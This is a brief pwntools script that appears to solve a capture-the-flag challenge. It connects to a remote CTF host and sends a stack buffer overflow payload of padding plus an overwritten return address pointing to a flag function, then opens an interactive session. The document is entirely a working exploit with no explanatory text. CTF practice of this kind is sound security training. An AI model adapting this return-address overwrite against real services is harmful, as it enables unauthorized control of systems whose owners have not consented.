from pwn import *

p = remote("ctf.j0n9hyun.xyz",3004)
flag = 0x0000000000400606
payload = 'R'*0x110
payload += 'I'*0x8
payload +=p64(flag)
p.sendline(payload)
p.interactive()
